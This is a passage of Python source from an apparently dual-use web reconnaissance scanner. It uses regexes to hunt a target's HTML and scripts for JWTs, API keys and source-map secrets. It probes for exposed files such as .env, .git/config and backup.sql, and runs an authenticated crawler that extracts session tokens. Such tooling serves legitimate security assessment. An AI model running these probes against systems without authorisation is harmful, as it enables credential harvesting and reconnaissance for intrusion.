            risk_assessment['high_risk_findings'].extend([f for f in comment_findings if 'Credential-related' in f])
        
        # Analyze forms for login patterns
        login_forms = self._analyze_forms(content)
        if login_forms:
            findings.append(f'Login forms detected ({len(login_forms)} instances)')
            detailed_findings['Login forms detected'] = login_forms
            risk_assessment['risk_score'] += 4
        
        # Source map analysis
        source_maps = self.source_map_analyzer.find_source_maps(content, self.target)
        if source_maps:
            findings.append(f'Source maps found ({len(source_maps)} instances)')
            detailed_findings['Source maps found'] = source_maps
            risk_assessment['risk_score'] += 6
            
            # Analyze source maps for secrets
            for map_url in source_maps[:2]:  # Limit to 2 maps
                map_analysis = self.source_map_analyzer.analyze_source_map(map_url)
                if 'findings' in map_analysis and map_analysis['findings']:
                    findings.append(f'Source map secrets ({len(map_analysis["findings"])} found)')
                    detailed_findings[f'Source map: {map_url}'] = map_analysis['findings']
                    risk_assessment['risk_score'] += 8
                    risk_assessment['high_risk_findings'].append('Source map secrets')
        
        # High entropy string detection
        high_entropy_strings = self.pattern_scanner.detect_high_entropy_strings(content + script_content)
        if high_entropy_strings:
            findings.append(f'High-entropy strings ({len(high_entropy_strings)} found)')
            detailed_findings['High-entropy strings'] = high_entropy_strings
            risk_assessment['risk_score'] += 5
        
        # Recalculate risk level
        if risk_assessment['risk_score'] >= 30:
            risk_assessment['risk_level'] = 'High'
        elif risk_assessment['risk_score'] >= 15:
            risk_assessment['risk_level'] = 'Medium'
        else:
            risk_assessment['risk_level'] = 'Low'
        
        return findings, detailed_findings, risk_assessment
    
    def _analyze_html_structure(self, content):
        """Analyze HTML structure using BeautifulSoup"""
        findings = []
        detailed_findings = {}
        
        try:
            from bs4 import BeautifulSoup, Comment
            soup = BeautifulSoup(content, 'html.parser')
            
            # 1. Inline script analysis
            inline_scripts = []
            for script_tag in soup.find_all('script'):
                if script_tag.string:
                    script_content = script_tag.string.strip()
                    inline_scripts.append(script_content)
                    
                    # Check for JWT tokens in inline scripts
                    jwt_matches = re.findall(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', script_content)
                    if jwt_matches:
                        findings.append(f'JWT tokens in inline scripts ({len(jwt_matches)} found)')
                        detailed_findings['JWT tokens in inline scripts'] = jwt_matches[:3]
                    
                    # Check for API keys/secrets in inline scripts
                    api_matches = re.findall(r'(api[_-]?key|secret|token)[\'"]?\s*[:=]\s*[\'"]?[A-Za-z0-9_\-]{10,}[\'"]?', script_content, re.I)
                    if api_matches:
                        findings.append(f'API keys in inline scripts ({len(api_matches)} found)')
                        detailed_findings['API keys in inline scripts'] = [match[0] if isinstance(match, tuple) else match for match in api_matches[:3]]
            
            if inline_scripts:
                findings.append(f'Inline scripts found ({len(inline_scripts)} instances)')
                detailed_findings['Inline scripts found'] = [script[:100] + '...' if len(script) > 100 else script for script in inline_scripts[:3]]
            
            # 2. Form analysis
            forms = []
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                inputs = [inp.get('type', 'text') for inp in form.find_all('input')]
                
                form_info = f"Action: {action}, Method: {method}, Inputs: {len(inputs)}"
                forms.append(form_info)
                
                if 'password' in inputs:
                    findings.append('Login forms detected')
                    if 'Login forms detected' not in detailed_findings:
                        detailed_findings['Login forms detected'] = []
                    detailed_findings['Login forms detected'].append(form_info)
            
            if forms:
                findings.append(f'HTML forms found ({len(forms)} instances)')
                detailed_findings['HTML forms found'] = forms[:5]
            
            # 3. Meta tag analysis
            meta_tags = []
            for meta in soup.find_all('meta'):
                name = meta.get('name', '')
                content_attr = meta.get('content', '')
                if name and content_attr:
                    if any(keyword in name.lower() for keyword in ['environment', 'debug', 'version', 'build']):
                        meta_tags.append(f"{name}: {content_attr}")
            
            if meta_tags:
                findings.append(f'Environment meta tags ({len(meta_tags)} found)')
                detailed_findings['Environment meta tags'] = meta_tags
            
            # 4. Enhanced comment analysis
            dev_comments = []
            for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
                comment_text = comment.strip()
                if any(keyword in comment_text.upper() for keyword in ['TODO', 'FIXME', 'DEBUG', 'HACK', 'BUG', 'DISABLE', 'AUTH']):
                    dev_comments.append(comment_text[:100])
            
            if dev_comments:
                findings.append(f'Developer comments ({len(dev_comments)} found)')
                detailed_findings['Developer comments'] = dev_comments
                
        except ImportError as _exc:
            # Fallback if BeautifulSoup not available
            pass
            logger.debug("Suppressed exception", exc_info=True)
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        return findings, detailed_findings
    
    def _extract_script_content(self, content):
        """Extract inline script content for analysis"""
        script_content = ""
        try:
            # Extract inline script tags
            script_matches = re.findall(r'<script[^>]*>(.*?)</script>', content, re.DOTALL | re.IGNORECASE)
            script_content = "\n".join(script_matches)
            
            # Also check for script src attributes for external JS files
            src_matches = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', content, re.IGNORECASE)
            if src_matches:
                script_content += "\n" + "\n".join(src_matches)
                
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        return script_content
    
    def _analyze_forms(self, content):
        """Analyze forms for login patterns and security issues"""
        forms = []
        try:
            # Find form tags with their attributes
            form_matches = re.findall(r'<form[^>]*>(.*?)</form>', content, re.DOTALL | re.IGNORECASE)
            
            for form_content in form_matches:
                form_info = {}
                
                # Check for password inputs
                if re.search(r'type=["\']password["\']', form_content, re.IGNORECASE):
                    form_info['type'] = 'Login Form'
                    
                    # Check for action attribute
                    action_match = re.search(r'action=["\']([^"\']+)["\']', form_content, re.IGNORECASE)
                    if action_match:
                        form_info['action'] = action_match.group(1)
                    
                    # Check for method
                    method_match = re.search(r'method=["\']([^"\']+)["\']', form_content, re.IGNORECASE)
                    if method_match:
                        form_info['method'] = method_match.group(1).upper()
                    
                    # Check for CSRF protection
                    if not re.search(r'(csrf|token|_token)', form_content, re.IGNORECASE):
                        form_info['csrf_protection'] = 'Missing'
                    
                    forms.append(form_info)
                    
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        return forms
    
    def _check_source_files(self):
        """Check for additional source files with improved catchall detection"""
        source_files = []
        common_files = [
            'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
            'config.php', 'phpinfo.php', 'info.php', 'test.php',
            'backup.sql', 'database.sql', '.env', '.git/config'
        ]
        
        # Enhanced catchall detection with multiple random tests
        catchall_responses = []
        try:
            for i in range(3):  # Test 3 random files
                random_file = f"{''.join(__import__('random').choices('abcdefghijklmnopqrstuvwxyz', k=15))}.{__import__('random').choice(['txt', 'php', 'html'])}"
                test_url = f"{self.target.rstrip('/')}/{random_file}"
                session = self._get_session()
                test_response = session.get(test_url, timeout=5)
                if test_response.status_code == 200:
                    catchall_responses.append({
                        'status': test_response.status_code,
                        'length': len(test_response.content),
                        'content_hash': hash(test_response.content[:1000])  # Hash first 1000 chars
                    })
            
            if len(catchall_responses) >= 2:  # If 2+ random files return 200, likely catchall
                avg_length = sum(r['length'] for r in catchall_responses) / len(catchall_responses)
                self.signals.output.emit(f"<p style='color: #FFAA00;'>Catchall detected (Avg length: {avg_length:.0f}), skipping file enumeration...</p><br>")
                return source_files  # Return empty list immediately
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        for file in common_files:
            if not self.is_running:
                break
            try:
                file_url = f"{self.target.rstrip('/')}/{file}"
                file_response = self._make_request('GET', file_url, timeout=5)
                
                if file_response.status_code == 200:
                    # Enhanced catchall filtering
                    is_catchall = False
                    if catchall_responses:
                        file_length = len(file_response.content)
                        file_hash = hash(file_response.content[:1000])
                        
                        for catchall in catchall_responses:
                            # Check if response is similar to catchall responses
                            if (abs(file_length - catchall['length']) < 200 and 
                                file_hash == catchall['content_hash']):
                                is_catchall = True
                                break
                    
                    if not is_catchall:
                        # Additional validation for specific files
                        if file == 'robots.txt' and 'user-agent' not in file_response.text.lower():
                            continue  # Not a real robots.txt
                        if file.endswith('.php') and len(file_response.content) < 50:
                            continue  # Likely empty or error response
                        
                        source_files.append(f'{file} accessible ({len(file_response.content)} bytes)')
                        self.signals.output.emit(f"<p style='color: #00FF41;'>Found source file: {h(file)}</p><br>")
                    else:
                        self.signals.output.emit(f"<p style='color: #666666;'>Filtered catchall: {h(file)}</p><br>")
                        
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
        
        return source_files
    
    def _export_source_code(self, content, source_files):
        """Export source code to file"""
        try:
            import tempfile
            import os
            from urllib.parse import urlparse
            
            parsed_url = urlparse(self.target)
            domain = parsed_url.netloc.replace(':', '_')
            
            # Create temporary file for source code
            temp_dir = tempfile.gettempdir()
            source_file = os.path.join(temp_dir, f"huginn_source_{domain}.html")
            
            with open(source_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.signals.output.emit(f"<p style='color: #87CEEB;'>Source code exported to: {h(source_file)}</p>")
            
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Could not export source code: {h(str(e))}</p>")
    
    def _source_code_analysis(self, results):
        try:
            self.signals.output.emit("<p style='color: #FFD700;'>Performing comprehensive source code analysis...</p><br>")
            
            response = self._make_request('GET', self.target, timeout=10, verify=self.ssl_verify)
            content = response.text
            
            # Store raw source code for export
            results['source_code'] = {'source': content}
            
            # Format and display source code with syntax highlighting
            self._display_formatted_source(content)
            
            # Analyze source code for sensitive information with risk assessment
            findings, detailed_findings, risk_assessment = self._analyze_source_content(content)
            
            # Check for additional source files
            source_files = self._check_source_files()
            
            all_findings = findings + source_files
            
            # APPEND ANALYSIS RESULTS BELOW SOURCE CODE
            # Display enhanced risk assessment with proper formatting
            risk_color = {'High': '#FF6B6B', 'Medium': '#FFD700', 'Low': '#00FF41'}.get(risk_assessment['risk_level'], '#87CEEB')
            self.signals.output.emit(f"<p style='color: {risk_color};'><b>🎯 Risk Assessment:</b> {h(risk_assessment['risk_level'])} (Score: {h(risk_assessment['risk_score'])})</p><br>")
            
            # Show top findings by score with proper formatting
            if 'top_findings' in risk_assessment and risk_assessment['top_findings']:
                self.signals.output.emit("<p style='color: #FFD700;'><b>🏆 Top Findings by Risk:</b></p><br>")
                for i, finding in enumerate(risk_assessment['top_findings'], 1):
                    category_color = {'sensitive': '#FF6B6B', 'security': '#FF8C00', 'technology': '#87CEEB', 'information': '#98FB98'}.get(finding['category'], '#FFFFFF')
                    self.signals.output.emit(f"<p style='color: {h(category_color)}; margin-left: 20px;'>{h(i)}. {h(finding['name'])} (Score: {h(finding['score'])}, Count: {h(finding['count'])})</p><br>")
                    self.signals.output.emit(f"<p style='margin-left: 20px; color: #CCCCCC;'>{h(finding['context'])}</p><br>")
                self.signals.output.emit("<br>")
            
            if risk_assessment['high_risk_findings']:
                self.signals.output.emit(f"<p style='color: #FF6B6B;'><b>🚨 High-Risk Findings:</b> {', '.join(risk_assessment['high_risk_findings'])}</p><br>")
            
            if all_findings:
                # Display detailed findings
                self.signals.output.emit("<p style='color: #FFD700;'><b>📋 Detailed Findings:</b></p><br>")
                
                for finding in all_findings:
                    self.signals.output.emit(f"<p style='color: #00FF41;'>• {h(finding)}</p>")
                    
                    # Show detailed information for each finding
                    details_found = False
                    for key, details in detailed_findings.items():
                        if any(word in finding.lower() for word in key.lower().split()):
                            details_found = True
                            if isinstance(details, list):
                                for detail in details[:3]:  # Show first 3 details
                                    self.signals.output.emit(f"<p style='margin-left: 20px; color: #87CEEB;'>  - {h(str(detail)[:100])}{'...' if len(str(detail)) > 100 else ''}</p>")
                            elif isinstance(details, dict):
                                for k, v in list(details.items())[:3]:
                                    self.signals.output.emit(f"<p style='margin-left: 20px; color: #87CEEB;'>  - {h(k)}: {h(str(v)[:100])}{'...' if len(str(v)) > 100 else ''}</p>")
                            break
                    
                    if not details_found:
                        # Try direct key matching
                        for key in detailed_findings.keys():
                            if key.lower() in finding.lower() or finding.lower() in key.lower():
                                details = detailed_findings[key]
                                if isinstance(details, list):
                                    for detail in details[:3]:
                                        self.signals.output.emit(f"<p style='margin-left: 20px; color: #87CEEB;'>  - {h(str(detail)[:100])}{'...' if len(str(detail)) > 100 else ''}</p>")
                                elif isinstance(details, dict):
                                    for k, v in list(details.items())[:3]:
                                        self.signals.output.emit(f"<p style='margin-left: 20px; color: #87CEEB;'>  - {h(k)}: {h(str(v)[:100])}{'...' if len(str(v)) > 100 else ''}</p>")
                                break
                    
                    self.signals.output.emit("<br>")
                
                # Collect headers data
                headers_info = {
                    'headers': dict(response.headers),
                    'security_headers': {},  # Could be enhanced
                    'missing_headers': [],
                    'server': response.headers.get('server', '')
                }
                self.data_collector.collect_headers(self.target, headers_info)
                
                results['source_findings'] = all_findings
                results['detailed_findings'] = detailed_findings
                results['risk_assessment'] = risk_assessment
                
                # Enhanced output with categorized findings and proper line breaks
                self.signals.output.emit(f"<p style='color: #00FF41;'>Source analysis complete: {len(all_findings)} findings</p><br>")
                
                # Enhanced categorized breakdown with proper formatting
                categories = {'sensitive': 0, 'security': 0, 'technology': 0, 'information': 0}
                
                # Count findings by category using pattern scanner data and comment findings
                for finding in all_findings:
                    pattern_name = finding.split(' found')[0].replace(' detected', '').replace(' accessible', '')
                    if pattern_name in self.pattern_scanner.patterns:
                        category = self.pattern_scanner.patterns[pattern_name]['category']
                        categories[category] += 1
                    elif 'HTML comments' in finding:
                        categories['information'] += 1
                    elif 'TODO/FIXME' in finding or 'Debug-related' in finding:
                        categories['technology'] += 1
                    elif 'Credential-related' in finding:
                        categories['sensitive'] += 1
                    elif 'accessible' in finding.lower():
                        categories['information'] += 1
                
                self.signals.output.emit("<p style='color: #87CEEB;'><b>📊 Findings by Category:</b></p><br>")
                category_colors = {'sensitive': '#FF6B6B', 'security': '#FF8C00', 'technology': '#87CEEB', 'information': '#98FB98'}
                category_icons = {'sensitive': '🔐', 'security': '🛡️', 'technology': '⚙️', 'information': 'ℹ️'}
                
                for category, count in categories.items():
                    if count > 0:
                        color = category_colors[category]
                        icon = category_icons[category]
                        self.signals.output.emit(f"<p style='color: {color}; margin-left: 20px;'>{h(icon)} {h(category.title())}: {count} findings</p>")
                
                # Add proper line break after categories
                self.signals.output.emit("<br>")
            else:
                self.signals.output.emit("<p style='color: #FFAA00;'>No significant source code findings</p><br>")
                results['risk_assessment'] = risk_assessment
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Source code analysis failed: {h(str(e))}</p><br>")
    
    def _update_crawl_tree_from_crawler(self, url, page_data):
        """Update crawl tree from crawler data"""
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # Enhanced data for authenticated crawling
            tree_data = {
                'url': url,
                'title': page_data.get('title', 'No title'),
                'status_code': page_data.get('status_code', 200),
                'method': 'Auth Crawler' if page_data.get('authenticated') else 'Crawler',
                'parent': base_url,
                'depth': page_data.get('depth', 1),
                'forms': len(page_data.get('forms', [])),
                'links': len(page_data.get('links', [])),
                'authenticated': page_data.get('authenticated', False)
            }
            
            # Add authentication artifacts if present
            auth_artifacts = page_data.get('auth_artifacts', {})
            if auth_artifacts:
                tree_data['auth_tokens'] = len(auth_artifacts.get('tokens', {}))
                tree_data['auth_cookies'] = len(auth_artifacts.get('cookies', {}))
                tree_data['storage_items'] = sum(len(data) for data in auth_artifacts.get('storage_data', {}).values())
            
            self.crawl_tree_data[url] = tree_data
            
            # Enhanced found items
            found_item = {
                'url': url,
                'status': page_data.get('status_code', 200),
                'type': 'auth_page' if page_data.get('authenticated') else 'page',
                'title': page_data.get('title', 'No title')
            }
            
            # Add authentication context
            if page_data.get('authenticated') and auth_artifacts:
                found_item['auth_data'] = {
                    'tokens': len(auth_artifacts.get('tokens', {})),
                    'cookies': len(auth_artifacts.get('cookies', {})),
                    'storage': sum(len(data) for data in auth_artifacts.get('storage_data', {}).values())
                }
            
            self.found_items.append(found_item)
            
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _web_crawler(self, results):
        try:
            # Check if authentication is configured
            if self.auth_method:
                self.signals.output.emit("<p style='color: #FFD700;'>Starting authenticated web crawler...</p><br>")
                self._authenticated_crawler(results)
            else:
                self.signals.output.emit("<p style='color: #FFD700;'>Starting standard web crawler...</p><br>")
                self._standard_crawler(results)
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Web crawling failed: {h(str(e))}</p><br>")
    
    def _authenticated_crawler(self, results):
        """Run authenticated crawler"""
        try:
            if AuthenticatedCrawler is None:
                self.signals.output.emit("<p style='color: #FFAA00;'>Authenticated crawler not available, falling back to standard crawler...</p><br>")
                self._standard_crawler(results)
                return
            
            self.authenticated_crawler = AuthenticatedCrawler()
            
            # Connect signals for real-time updates
            self.authenticated_crawler.auth_success.connect(self._on_auth_success)
            self.authenticated_crawler.auth_failed.connect(self._on_auth_failed)
            self.authenticated_crawler.page_crawled.connect(self._on_page_crawled)
            self.authenticated_crawler.token_extracted.connect(self._on_token_extracted)
            
            # Attempt authentication
            self.signals.output.emit(f"<p style='color: #87CEEB;'>Attempting authentication using {h(self.auth_method)}...</p><br>")
            
            auth_success = self.authenticated_crawler.authenticate(
                target_url=self.target,
                auth_method=self.auth_method,
                username=self.username,
                password=self.password,
                custom_headers=self.auth_headers,
                cookies=self.auth_cookies
            )
            
            if auth_success:
                self.signals.output.emit("<p style='color: #00FF41;'>Authentication successful! Starting authenticated crawl...</p><br>")
                
                # Perform authenticated crawling
                crawled_data = self.authenticated_crawler.crawl_authenticated(
                    target_url=self.target,
                    max_depth=3,
                    max_pages=50
                )
                
                # Export authentication session
                auth_session = self.authenticated_crawler.export_auth_session()
                results['auth_session'] = auth_session
                results['crawl_results'] = crawled_data
                
                self.signals.output.emit(f"<p style='color: #00FF41;'>Authenticated crawl completed: {len([p for p in crawled_data.values() if 'error' not in p])} pages</p><br>")
                
            else:
                self.signals.output.emit("<p style='color: #FFAA00;'>Authentication failed, falling back to standard crawler...</p><br>")
                self._standard_crawler(results)
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Authenticated crawling failed: {h(str(e))}</p><br>")
            self._standard_crawler(results)
    
    def _standard_crawler(self, results):
        """Run standard crawler"""
        if WebCrawler is None:
            self.signals.output.emit("<p style='color: #FFAA00;'>Web crawler not available</p><br>")
            return
        
        crawler = WebCrawler(max_depth=3, max_pages=50)
        
        # Use resolved IP if available
        target_url = self.target
        if hasattr(self, 'resolved_ip') and hasattr(self, 'original_hostname'):
            target_url = self.target.replace(self.original_hostname, self.resolved_ip)
            # Set Host header for crawler
            crawler.session.headers['Host'] = self.original_hostname
        
        crawled_data = crawler.crawl_site(target_url)
        
        # Real-time updates to crawl tree
        for url, page_data in crawled_data.items():
            if not self.is_running:
                break
            if 'error' not in page_data:
                self.signals.output.emit(f"<p style='color: #00FF41;'>Crawled: {h(url)}</p>")
                self.signals.output.emit(f"<p>&nbsp;&nbsp;Title: {h(page_data.get('title', 'No title'))}</p>")
                self.signals.output.emit(f"<p>&nbsp;&nbsp;Status: {h(page_data.get('status_code', 'Unknown'))}</p>")
                
                if page_data.get('forms'):
                    self.signals.output.emit(f"<p>&nbsp;&nbsp;Forms: {len(page_data['forms'])}</p>")
                
                if page_data.get('links'):
                    self.signals.output.emit(f"<p>&nbsp;&nbsp;Links: {len(page_data['links'])}</p>")
                
                self.signals.output.emit("<br>")
                
                # Update crawl tree in real-time
                self._update_crawl_tree_from_crawler(url, page_data)
                
                # Send real-time update
                self.signals.results_ready.emit({
                    'crawl_data': self.crawl_tree_data,
                    'found_items': self.found_items
                })
            else:
                self.signals.output.emit(f"<p style='color: #FFAA00;'>Error crawling {h(url)}: {h(page_data['error'])}</p><br>")
        
        if crawled_data:
            results['crawl_results'] = crawled_data
            self.signals.output.emit(f"<p style='color: #00FF41;'>Successfully crawled {len([p for p in crawled_data.values() if 'error' not in p])} pages</p><br>")
        else:
            self.signals.output.emit("<p style='color: #FFAA00;'>No pages crawled</p><br>")
    
    def _on_auth_success(self, method: str, credentials: dict):
        """Handle successful authentication"""
        self.signals.output.emit(f"<p style='color: #00FF41;'>✅ Authentication successful via {h(method)}</p><br>")
        
        # Display extracted tokens/cookies
        if 'tokens' in credentials:
            for token_name, token_value in credentials['tokens'].items():
                masked_token = token_value[:10] + "..." if len(token_value) > 10 else token_value
                self.signals.output.emit(f"<p style='color: #87CEEB;'>🔑 Token extracted: {h(token_name)} = {h(masked_token)}</p><br>")
    
    def _on_auth_failed(self, method: str, error: str):
        """Handle authentication failure"""
        self.signals.output.emit(f"<p style='color: #FF6B6B;'>❌ Authentication failed via {h(method)}: {h(error)}</p><br>")
    
    def _on_page_crawled(self, url: str, page_data: dict):
        """Handle page crawled event"""
        self.signals.output.emit(f"<p style='color: #00FF41;'>🔍 Crawled (Auth): {h(url)}</p>")
        self.signals.output.emit(f"<p>&nbsp;&nbsp;Title: {h(page_data.get('title', 'No title'))}</p>")
        self.signals.output.emit(f"<p>&nbsp;&nbsp;Status: {h(page_data.get('status_code', 'Unknown'))}</p>")
        
        # Display authentication artifacts if found
        auth_artifacts = page_data.get('auth_artifacts', {})
        if auth_artifacts.get('tokens'):
            self.signals.output.emit(f"<p>&nbsp;&nbsp;🔑 Auth tokens found: {len(auth_artifacts['tokens'])}</p>")
        
        if auth_artifacts.get('storage_data'):
            storage_count = sum(len(data) for data in auth_artifacts['storage_data'].values())
            self.signals.output.emit(f"<p>&nbsp;&nbsp;💾 Storage data: {h(storage_count)} items</p>")
        
        self.signals.output.emit("<br>")
        
        # Update crawl tree
        self._update_crawl_tree_from_crawler(url, page_data)
        
        # Send real-time update
        self.signals.results_ready.emit({
            'crawl_data': self.crawl_tree_data,
            'found_items': self.found_items
        })
    
    def _on_token_extracted(self, token_type: str, token_value: str, source: str):
        """Handle token extraction event"""
        masked_token = token_value[:15] + "..." if len(token_value) > 15 else token_value
        self.signals.output.emit(f"<p style='color: #FFD700;'>🎯 {h(token_type)} token found in {h(source)}: {h(masked_token)}</p><br>")
    
    def _enterprise_scripts(self, results):
        try:
            self.signals.output.emit("<p style='color: #FFD700;'>Running Enterprise Security Assessment...</p><br>")
            
            from .enterprise_fingerprint import EnterpriseFingerprinter
            
            fingerprinter = EnterpriseFingerprinter()
            total_steps = 6
            self.signals.progress_start.emit(total_steps, "Starting enterprise assessment")
            
            # Comprehensive enterprise fingerprinting
            self.signals.progress_update.emit(1, 0, "Advanced fingerprinting")
            enterprise_results = fingerprinter.comprehensive_fingerprint(self.target)
            
            # Display results with rich formatting
            self.signals.progress_update.emit(2, 0, "Processing fingerprint results")
            self._display_enterprise_fingerprint(enterprise_results['fingerprint'])
            
            self.signals.progress_update.emit(3, 0, "Processing security audit")
            self._display_security_audit(enterprise_results['security_audit'])
            
            self.signals.progress_update.emit(4, 0, "Processing surface index")
            self._display_surface_index(enterprise_results['surface_index'])
            
            self.signals.progress_update.emit(5, 0, "Processing device matches")
            self._display_device_matches(enterprise_results['device_match'])
            
            self.signals.progress_update.emit(6, 0, "Processing vulnerabilities")
            self._display_vulnerabilities(enterprise_results['vulnerabilities'])
            
            results['enterprise_results'] = enterprise_results
            # Build tree structure for graph view
            self._build_enterprise_tree(enterprise_results)
            
            self.signals.output.emit(f"<p style='color: #00FF41;'>Enterprise assessment completed successfully</p><br>")
            
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Enterprise assessment failed: {h(str(e))}</p><br>")
    
    def _build_enterprise_tree(self, results):
        """Build tree structure for enterprise results"""
        try:
            self.crawl_tree_data = {}
            
            # Enterprise Assessment category
            enterprise_key = "Enterprise Assessment"
            self.crawl_tree_data[enterprise_key] = {
                'name': 'Enterprise Assessment',
                'type': 'category',
                'children': []
            }
            
            # Add fingerprint results
            if 'fingerprint' in results:
                fp = results['fingerprint']
                if fp.get('server'):
                    self.crawl_tree_data[enterprise_key]['children'].append({
                        'field': 'Server:',
                        'value': fp['server'],
                        'type': 'detail'
                    })
                if fp.get('title'):
                    self.crawl_tree_data[enterprise_key]['children'].append({
                        'field': 'Title:',
                        'value': fp['title'],
                        'type': 'detail'
                    })
            
            # Add security audit results
            if 'security_audit' in results:
                audit = results['security_audit']
                if audit.get('security_headers', {}).get('score'):
                    self.crawl_tree_data[enterprise_key]['children'].append({
                        'field': 'Security Headers:',
                        'value': audit['security_headers']['score'],
                        'type': 'detail'
                    })
                
                # Default credentials
                if audit.get('default_creds'):
                    for cred in audit['default_creds']:
                        self.crawl_tree_data[enterprise_key]['children'].append({
                            'field': 'Default Creds:',
                            'value': f"{cred['username']}/{cred['password']}",
                            'type': 'vulnerability'
                        })
            
            # Add device matches
            if 'device_match' in results and results['device_match']:
                for match in results['device_match'][:3]:
                    self.crawl_tree_data[enterprise_key]['children'].append({
                        'field': f"{match['vendor'].upper()}:",
                        'value': f"{match['confidence']}% confidence",
                        'type': 'match'
                    })
            
            # Add vulnerabilities
            if 'vulnerabilities' in results and results['vulnerabilities']:
                for vuln in results['vulnerabilities']:
                    self.crawl_tree_data[enterprise_key]['children'].append({
                        'field': f"{vuln['type']}:",
                        'value': vuln.get('severity', 'Unknown'),
                        'type': 'vulnerability'
                    })
                    
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _build_directory_tree(self, results):
        """Build tree structure for directory enumeration results"""
        try:
            if 'directories' in results:
                dir_key = "Directory Enumeration"
                self.crawl_tree_data[dir_key] = {
                    'name': 'Directory Enumeration',
                    'type': 'category',
                    'children': []
                }
                
                for directory in results['directories']:
                    self.crawl_tree_data[dir_key]['children'].append({
                        'field': directory['path'],
                        'value': f"Status: {directory['status']}",
                        'type': 'directory'
                    })
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _build_source_tree(self, results):
        """Build tree structure for source code analysis results"""
        try:
            self.crawl_tree_data = {}
            
            # 1. SOURCE CODE CATEGORY
            if 'source_code' in results:
                source_key = "Source Code"
                self.crawl_tree_data[source_key] = {
                    'name': 'Source Code',
                    'type': 'category',
                    'children': []
                }
                
                source_data = results['source_code']
                if 'source' in source_data:
                    source_length = len(source_data['source'])
                    self.crawl_tree_data[source_key]['children'].append({
                        'field': 'Source Length:',
                        'value': f'{source_length:,} characters',
                        'type': 'detail'
                    })
            
            # 2. RISK ASSESSMENT CATEGORY
            if 'risk_assessment' in results:
                risk_data = results['risk_assessment']
                risk_key = "Risk Assessment"
                self.crawl_tree_data[risk_key] = {
                    'name': 'Risk Assessment',
                    'type': 'category',
                    'children': []
                }
                
                self.crawl_tree_data[risk_key]['children'].append({
                    'field': 'Risk Level:',
                    'value': risk_data.get('risk_level', 'Unknown'),
                    'type': 'risk'
                })
                
                self.crawl_tree_data[risk_key]['children'].append({
                    'field': 'Risk Score:',
                    'value': str(risk_data.get('risk_score', 0)),
                    'type': 'score'
                })
            
            # 3. TOP FINDINGS CATEGORY - Add detailed top findings first
            if 'risk_assessment' in results and 'top_findings' in results['risk_assessment'] and results['risk_assessment']['top_findings']:
                top_key = "Top Risk Findings"
                self.crawl_tree_data[top_key] = {
                    'name': 'Top Risk Findings',
                    'type': 'category',
                    'children': []
                }
                
                for finding in results['risk_assessment']['top_findings']:
                    parent_finding = {
                        'field': f"{finding['name']} (Score: {finding['score']})",
                        'value': finding['context'],
                        'type': 'risk_finding',
                        'children': []
                    }
                    
                    # Add actual finding details if available in detailed_findings
                    detailed_findings = results.get('detailed_findings', {})
                    finding_key = finding['name'].replace(' found', '').replace(' detected', '')
                    if finding_key in detailed_findings and detailed_findings[finding_key]:
                        for detail in detailed_findings[finding_key][:3]:  # Show first 3 details
                            parent_finding['children'].append({
                                'field': 'Detail:',
                                'value': str(detail)[:100] + ('...' if len(str(detail)) > 100 else ''),
                                'type': 'detail'
                            })
                    
                    self.crawl_tree_data[top_key]['children'].append(parent_finding)
            
            # 4. FINDINGS CATEGORY - Build hierarchical tree structure
            if 'source_findings' in results and results['source_findings']:
                detailed_findings = results.get('detailed_findings', {})
                
                # Process each finding type with proper parent-child structure
                for finding in results['source_findings']:
                    # Create parent category for each finding
                    parent_key = finding
                    self.crawl_tree_data[parent_key] = {
                        'name': finding,
                        'type': 'category',
                        'children': []
                    }
                    
                    # Find matching detailed findings using fuzzy matching
                    details_added = False
                    for key, details in detailed_findings.items():
                        if any(word in finding.lower() for word in key.lower().split()) or key.lower() in finding.lower():
                            details_added = True
                            if isinstance(details, list):
                                for i, detail in enumerate(details[:5]):  # Show first 5 details
                                    self.crawl_tree_data[parent_key]['children'].append({
                                        'field': f'Item {i+1}:',
                                        'value': str(detail)[:150] + ('...' if len(str(detail)) > 150 else ''),
                                        'type': 'detail'
                                    })
                            elif isinstance(details, dict):
                                for k, v in list(details.items())[:5]:
                                    self.crawl_tree_data[parent_key]['children'].append({
                                        'field': f'{k}:',
                                        'value': str(v)[:150] + ('...' if len(str(v)) > 150 else ''),
                                        'type': 'detail'
                                    })
                            break
                    
                    # If no details found with fuzzy matching, add a placeholder
                    if not details_added:
                        self.crawl_tree_data[parent_key]['children'].append({
                            'field': 'Status:',
                            'value': 'Details available in scan results',
                            'type': 'info'
                        })
                    
                    # Handle specific finding types with custom formatting
                    if 'HTML comments' in finding and detailed_findings.get('HTML comments found'):
                        for detail in detailed_findings['HTML comments found'][:5]:
                            self.crawl_tree_data[parent_key]['children'].append({
                                'field': 'Comment:',
                                'value': f"<!-- {detail.strip()[:100]} -->",
                                'type': 'detail'
                            })

        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _build_crawler_tree(self, results):
        """Build tree structure for crawler results"""
        try:
            if 'crawl_results' in results:
                # Clear existing data for crawler
                self.crawl_tree_data = {}
                
                for url, page_data in results['crawl_results'].items():
                    if 'error' not in page_data:
                        self.crawl_tree_data[url] = {
                            'field': url,
